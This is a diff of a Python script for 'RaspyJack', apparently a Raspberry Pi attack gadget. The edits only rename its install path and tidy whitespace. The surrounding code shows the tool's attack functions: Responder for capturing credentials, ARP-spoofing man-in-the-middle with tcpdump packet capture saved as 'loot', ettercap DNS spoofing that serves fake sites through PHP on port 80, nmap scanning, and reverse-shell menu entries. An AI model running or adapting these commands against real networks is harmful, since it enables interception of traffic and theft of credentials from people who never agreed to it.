@@ -51,8 +51,8 @@ def start_background_loops():
 
 
 if os.getuid() != 0:
-	print("You need a sudo to run this!")
-	exit()
+        print("You need a sudo to run this!")
+        exit()
 print(" ")
 print(" ------ RaspyJack Started !!! ------ ")
 start_time = time.time()
@@ -69,7 +69,7 @@ class Defaults():
 
     imgstart_path = "/root/"
 
-    install_path = "/root/raspyjack/"
+    install_path = "/root/Raspyjack/"
     config_file = install_path + "gui_conf.json"
 
     hid_ducky_path = "/tmp"
@@ -211,7 +211,7 @@ def SaveConfig() -> None:
         json.dump(data, wf, indent=4, sort_keys=True)
     print("Config has been saved!")
 
-    
+
 
 def LoadConfig():
     global PINS
@@ -709,7 +709,7 @@ def Explorer(path="/",extensions=""):
 
 def ReadTextFileNmap():
     while 1:
-        rfile = Explorer("/root/raspyjack/loot/Nmap/",extensions=".txt\|.json\|.conf\|.pcap")
+        rfile = Explorer("/root/Raspyjack/loot/Nmap/",extensions=".txt\|.json\|.conf\|.pcap")
         if rfile == "":
             break
         with open(rfile) as f:
@@ -718,7 +718,7 @@ def ReadTextFileNmap():
 
 def ReadTextFileResponder():
     while 1:
-        rfile = Explorer("/root/raspyjack/Responder/logs/",extensions=".log\|.txt\|.pcap")
+        rfile = Explorer("/root/Raspyjack/Responder/logs/",extensions=".log\|.txt\|.pcap")
         if rfile == "":
             break
         with open(rfile) as f:
@@ -727,7 +727,7 @@ def ReadTextFileResponder():
 
 def ReadTextFileDNSSpoof():
     while 1:
-        rfile = Explorer("/root/raspyjack/DNSSpoof/captures/",extensions=".log\|.txt\|.pcap")
+        rfile = Explorer("/root/Raspyjack/DNSSpoof/captures/",extensions=".log\|.txt\|.pcap")
         if rfile == "":
             break
         with open(rfile) as f:
@@ -782,7 +782,7 @@ def run_scan(label: str, nmap_args: list[str]):
     ip_with_mask = subprocess.check_output("ip -4 addr show eth0 | awk '/inet / { print $2 }'",shell=True).decode().strip()
 
     ts   = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
-    path = f"/root/raspyjack/loot/Nmap/{label.lower().replace(' ', '_')}_{ts}.txt"
+    path = f"/root/Raspyjack/loot/Nmap/{label.lower().replace(' ', '_')}_{ts}.txt"
 
     subprocess.run(["nmap", *nmap_args, "-oN", path, ip_with_mask])
     subprocess.run(["sed", "-i", "s/Nmap scan report for //g", path])
@@ -842,7 +842,7 @@ def responder_on():
         Dialog_info(" Already running !!!!", wait=True)
         time.sleep(2)
     else:
-        os.system('python3 /root/raspyjack/Responder/Responder.py -Q -I eth0 &')
+        os.system('python3 /root/Raspyjack/Responder/Responder.py -Q -I eth0 &')
         Dialog_info("     Responder \n      started !!", wait=True)
         time.sleep(2)
 
@@ -897,11 +897,11 @@ def Start_MITM(site_spoof):
 
 # Start tcpdump capture to sniff network traffic
         now = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
-        pcap_file = f"/root/raspyjack/loot/MITM/network_traffic_{now}.pcap"
+        pcap_file = f"/root/Raspyjack/loot/MITM/network_traffic_{now}.pcap"
         print(f"[*] Starting tcpdump capture and writing packets to {pcap_file}...")
         os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
         tcpdump_process = subprocess.Popen(["tcpdump", "-i", "eth0", "-w", pcap_file], stdout=subprocess.PIPE)
-        tcpdump_process.stdout.close() 
+        tcpdump_process.stdout.close()
         Dialog_info(f" MITM & Sniff\n Sur {len(hosts)-1} hosts !!!", wait=True)
         time.sleep(8)
     else:
@@ -932,7 +932,7 @@ def spoof_site(name: str):
     subprocess.run("pkill -f 'php'", shell=True)   # stoppe les instances PHP
     time.sleep(1)
 
-    webroot = f"/root/raspyjack/DNSSpoof/sites/{name}"
+    webroot = f"/root/Raspyjack/DNSSpoof/sites/{name}"
     cmd = f"cd {webroot} && php -S 0.0.0.0:80"
     subprocess.Popen(cmd, shell=True)              # launch the built-in PHP
 
@@ -971,7 +971,7 @@ def Start_DNSSpoofing():
     print("------------------------------- ")
 
 # Commands executed in the background
-    website_command = f"cd /root/raspyjack/DNSSpoof/sites/{site_spoof} && php -S 0.0.0.0:80"
+    website_command = f"cd /root/Raspyjack/DNSSpoof/sites/{site_spoof} && php -S 0.0.0.0:80"
     ettercap_command = "ettercap -Tq -M arp:remote -P dns_spoof"
     Dialog_info(f"    DNS Spoofing\n   {site_spoof}  started !!!", wait=True)
     time.sleep(2)
@@ -1013,7 +1013,7 @@ class DisposableMenu:
             [f" {name}", partial(run_scan, name, args)]
             for name, args in SCANS.items()
         ),
-        
+
         "ac": (
             [" Defaut Reverse",  defaut_Reverse],
             [" Remote Reverse",  remote_Reverse]
@@ -1070,7 +1070,7 @@ class DisposableMenu:
         "ak": tuple(
             [f" {site}", partial(spoof_site, site)]
             for site in SITES
-        ),                  
+        ),
     }
 
     # -----------------------------------------------------------------
